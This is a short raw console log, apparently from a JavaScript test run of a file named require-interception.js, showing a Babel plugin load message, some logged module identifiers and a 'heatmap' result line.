b"Loaded babel plugin\n  console.log\n    [ 'combine', 'Config', 'CombineConfig', 'storage', 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 4\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"